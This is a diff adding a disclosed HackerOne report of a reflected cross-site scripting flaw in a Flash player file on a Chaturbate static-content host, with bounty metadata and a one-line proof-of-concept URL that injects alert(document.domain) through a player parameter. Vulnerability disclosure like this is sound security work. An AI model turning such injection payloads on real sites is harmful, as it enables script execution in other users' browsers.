@@ -1,0 +1,25 @@
+ReportLink:https://hackerone.com/reports/386340
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/nahamsec
+ReportedTo:Chaturbate(chaturbate)
+BountyAmount:300.0
+Severity:medium
+State:Closed
+DateOfDisclosure:19.09.2018 23:35:21
+
+Summary:
+
+Hey there,
+
+There's a SWF based XSS on ssl-ccstatic.highwebmedia.com. You may want to update/remove the file.
+
+
+#POC
+https://ssl-ccstatic.highwebmedia.com/jwplayer/player.swf?playerready=alert(document.domain)
+
+Thanks,
+Ben
+
+## Impact
+
+#
